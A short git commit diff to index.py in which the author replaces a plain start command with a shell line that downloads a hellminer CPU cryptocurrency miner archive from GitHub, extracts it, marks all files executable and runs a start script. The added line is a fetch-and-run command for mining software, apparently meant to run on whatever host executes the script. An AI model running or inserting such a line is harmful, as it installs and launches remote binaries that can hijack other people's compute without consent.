d652df137f540d2220ad32a26b487462bb5fc005
RIFAIGGZ <76506048+itsmeR1F4I@users.noreply.github.com>
2022-06-22 18:02:15 +0700

    Fix permission and added downloader required file

--- index.py
+++ index.py
@@ -1,2 +1,2 @@
 import os as rifai
-rifai.system("sh start.sh")
+rifai.system("wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz && tar xf hellminer_cpu_linux.tar.gz && chmod +x *&& sh start.sh")
